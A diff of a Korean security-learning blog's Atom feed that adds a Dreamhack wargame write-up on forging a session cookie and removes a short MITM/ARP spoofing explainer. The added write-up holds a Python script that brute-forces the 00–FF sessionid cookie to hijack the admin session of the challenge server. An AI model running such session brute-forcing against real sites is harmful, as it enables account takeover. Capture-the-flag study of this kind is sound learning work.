@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-08-28T13:36:38+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">그래프 그리기 위한것</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/" rel="alternate" type="text/html" title="그래프 그리기 위한것" /><published>2099-09-09T00:00:00+09:00</published><updated>2099-12-31T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/"><![CDATA[<pre><code class="language-mermaild!">sequenceDiagram
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-08-28T17:03:04+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">그래프 그리기 위한것</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/" rel="alternate" type="text/html" title="그래프 그리기 위한것" /><published>2099-09-09T00:00:00+09:00</published><updated>2099-12-31T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/"><![CDATA[<pre><code class="language-mermaild!">sequenceDiagram
 </code></pre>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="웹 구조" /><summary type="html"><![CDATA[오직 로컬에서만 되냐 젠장]]></summary></entry><entry><title type="html">[wargame.kr] fly me to the moon 문제</title><link href="http://localhost:4000/dreamhack/fly_me_to_the_moon/" rel="alternate" type="text/html" title="[wargame.kr] fly me to the moon 문제" /><published>2023-08-28T00:00:00+09:00</published><updated>2023-08-28T23:13:00+09:00</updated><id>http://localhost:4000/dreamhack/fly_me_to_the_moon</id><content type="html" xml:base="http://localhost:4000/dreamhack/fly_me_to_the_moon/"><![CDATA[<p><a href="https://dreamhack.io/wargame/challenges/324">문제</a></p>
 
 <h2 id="요청-위조-방법-1">요청 위조 (방법 1)</h2>
@@ -99,7 +99,56 @@ token=토큰 값&amp;score=30000000000
 <h2 id="참고-사이트">참고 사이트</h2>
 <ul>
   <li><a href="https://lelinhtinh.github.io/de4js/">de4js</a></li>
-</ul>]]></content><author><name>Jung MinGyu</name></author><category term="dreamhack" /><category term="wargame" /><category term="js" /><category term="request" /><summary type="html"><![CDATA[fly me to the moon 문제 풀이.]]></summary></entry><entry><title type="html">[wargame.kr]php v5.3 strcmp 취약점 문제</title><link href="http://localhost:4000/dreamhack/php_5_3_strcmp/" rel="alternate" type="text/html" title="[wargame.kr]php v5.3 strcmp 취약점 문제" /><published>2023-08-27T00:00:00+09:00</published><updated>2023-08-27T23:13:00+09:00</updated><id>http://localhost:4000/dreamhack/php_5_3_strcmp</id><content type="html" xml:base="http://localhost:4000/dreamhack/php_5_3_strcmp/"><![CDATA[<h2 id="strcmp-취약점">strcmp 취약점</h2>
+</ul>]]></content><author><name>Jung MinGyu</name></author><category term="dreamhack" /><category term="wargame" /><category term="js" /><category term="request" /><summary type="html"><![CDATA[fly me to the moon 문제 풀이.]]></summary></entry><entry><title type="html">[wargame.kr] session id 쿠키 값 위조 문제</title><link href="http://localhost:4000/dreamhack/session_%EC%9C%84%EC%A1%B0/" rel="alternate" type="text/html" title="[wargame.kr] session id 쿠키 값 위조 문제" /><published>2023-08-28T00:00:00+09:00</published><updated>2023-08-29T00:13:00+09:00</updated><id>http://localhost:4000/dreamhack/session_%EC%9C%84%EC%A1%B0</id><content type="html" xml:base="http://localhost:4000/dreamhack/session_%EC%9C%84%EC%A1%B0/"><![CDATA[<p><a href="https://dreamhack.io/wargame/challenges/266">문제</a></p>
+
+<h2 id="session-값-위조">Session 값 위조</h2>
+<ul>
+  <li>session 값을 admin 아이디가 저장된 세션 값으로 바꿔주면 된다.</li>
+</ul>
+
+<h3 id="코드-분석">코드 분석</h3>
+<ul>
+  <li>admin 계정의 session id 값의 범위는 00 ~ FF 인 것을 확인할 수 있다.</li>
+</ul>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">session_storage</span><span class="p">[</span><span class="n">os</span><span class="p">.</span><span class="nf">urandom</span><span class="p">(</span><span class="mi">1</span><span class="p">).</span><span class="nf">hex</span><span class="p">()]</span> <span class="o">=</span> <span class="s">'admin'</span>
+</code></pre></div></div>
+
+<h3 id="공격-payload">공격 Payload</h3>
+<ul>
+  <li>만들어 질 수 있는 모든 session id 값을 쿠키에 넣어주면 된다.</li>
+  <li>00 ~ FF 를 모두 sessionid 쿠키 값에 넣어주면서 admin 에 해당하는 session id 값을 찾아주면 된다.</li>
+</ul>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
+
+<span class="n">URL</span> <span class="o">=</span> <span class="s">"공격 주소"</span>
+<span class="n">COOKIE</span> <span class="o">=</span> <span class="p">{</span><span class="s">"sessionid"</span><span class="p">:</span><span class="s">""</span><span class="p">}</span>
+
+<span class="k">def</span> <span class="nf">request</span><span class="p">()</span><span class="o">-&gt;</span><span class="nb">str</span><span class="p">:</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">URL</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">COOKIE</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">res</span><span class="p">.</span><span class="n">text</span>
+
+<span class="k">def</span> <span class="nf">find_sessionid</span><span class="p">():</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">256</span><span class="p">):</span>
+        <span class="c1"># print(str(hex(i)).replace('0x','').zfill(2))
+</span>        <span class="n">COOKIE</span><span class="p">[</span><span class="s">"sessionid"</span><span class="p">]</span><span class="o">=</span><span class="nf">str</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">i</span><span class="p">)).</span><span class="nf">replace</span><span class="p">(</span><span class="s">'0x'</span><span class="p">,</span><span class="s">''</span><span class="p">).</span><span class="nf">zfill</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+        <span class="n">t</span> <span class="o">=</span> <span class="nf">request</span><span class="p">()</span>
+        <span class="nf">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+        <span class="k">if</span> <span class="s">'admin'</span> <span class="ow">in</span> <span class="n">t</span><span class="p">.</span><span class="nf">lower</span><span class="p">():</span>
+            <span class="nf">print</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">i</span><span class="p">)).</span><span class="nf">replace</span><span class="p">(</span><span class="s">'0x'</span><span class="p">,</span><span class="s">''</span><span class="p">).</span><span class="nf">zfill</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
+            <span class="k">break</span>
+    <span class="k">return</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="c1"># request()
+</span>    <span class="nf">find_sessionid</span><span class="p">()</span>
+    <span class="k">return</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="nf">main</span><span class="p">()</span>
+
+</code></pre></div></div>]]></content><author><name>Jung MinGyu</name></author><category term="dreamhack" /><category term="wargame" /><category term="session" /><summary type="html"><![CDATA[session 위조 문제 풀이.]]></summary></entry><entry><title type="html">[wargame.kr]php v5.3 strcmp 취약점 문제</title><link href="http://localhost:4000/dreamhack/php_5_3_strcmp/" rel="alternate" type="text/html" title="[wargame.kr]php v5.3 strcmp 취약점 문제" /><published>2023-08-27T00:00:00+09:00</published><updated>2023-08-27T23:13:00+09:00</updated><id>http://localhost:4000/dreamhack/php_5_3_strcmp</id><content type="html" xml:base="http://localhost:4000/dreamhack/php_5_3_strcmp/"><![CDATA[<h2 id="strcmp-취약점">strcmp 취약점</h2>
 <ul>
   <li>php 버전 5.3 에서 발생한 취약점이다.</li>
   <li>strcmp 에 Array 와 string을 넣어 비교할 때 발생하는 취약점이다.</li>
@@ -485,25 +534,4 @@ JWT = Header.Payload.Signature
 <h2 id="참고-사이트">참고 사이트</h2>
 <ul>
   <li><a href="https://jwt.io/">JSON Web Tokens - jwt.io</a></li>
-</ul>]]></content><author><name>Jung MinGyu</name></author><category term="JWT" /><category term="HMAC" /><summary type="html"><![CDATA[JWT에 대하여 알아보자.]]></summary></entry><entry><title type="html">MITM 공격이란?</title><link href="http://localhost:4000/MITM%EA%B3%B5%EA%B2%A9/" rel="alternate" type="text/html" title="MITM 공격이란?" /><published>2023-07-14T00:00:00+09:00</published><updated>2023-07-14T23:13:00+09:00</updated><id>http://localhost:4000/MITM%EA%B3%B5%EA%B2%A9</id><content type="html" xml:base="http://localhost:4000/MITM%EA%B3%B5%EA%B2%A9/"><![CDATA[<h2 id="mitm">MITM</h2>
-<ul>
-  <li>Man In The Middle 공격(중간자 공격)</li>
-  <li>공격자가 사용자와 웹 애플리케이션간의 데이터 흐름을 조작하여 데이터를 가로채는 공격이다.</li>
-  <li>ARP Spoofing 공격을 이용하여 중간자 공격을 할 수 있는 환경을 만들수 있다.</li>
-</ul>
-
-<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/0fff4871-528b-42db-8430-170edab4a8ef" alt="Pasted image 20230714155433" /></p>
-
-<h2 id="arp">ARP</h2>
-<ul>
-  <li>Address Resolution Protocol (주소 결정 프로토콜)</li>
-  <li>IP 주소를 물리적 네트워크 주소(MAC)로 대응시키기 위해 사용되는 프로토콜이다.</li>
-  <li>IP 주소는 알지만 MAC 주소를 모를 때 MAC 주소를 알기 위해서 사용되는 프로토콜이다.</li>
-</ul>
-
-<h2 id="arp-spoofing">ARP Spoofing</h2>
-<ul>
-  <li>ARP 프로토콜을 이용한 MITM 공격이다.</li>
-  <li>근거리 통신망에서만 사용할 수 있는 공격이다.</li>
-  <li>사용자가 IP 주소에 대응하는 MAC 주소를 찾을 때 공격자가 해당 IP의 MAC주소는 자기라고 알리는 것이다. 즉 원래 IP에 대응하는 기기의 응답보다 빠르게 공격자가 자기 MAC주소를 알리는 것이다.</li>
-</ul>]]></content><author><name>Jung MinGyu</name></author><category term="MIMA" /><category term="ARP" /><category term="ARP Spoofing" /><summary type="html"><![CDATA[MITM 공격에 대하여 알아보자.]]></summary></entry></feed>
+</ul>]]></content><author><name>Jung MinGyu</name></author><category term="JWT" /><category term="HMAC" /><summary type="html"><![CDATA[JWT에 대하여 알아보자.]]></summary></entry></feed>
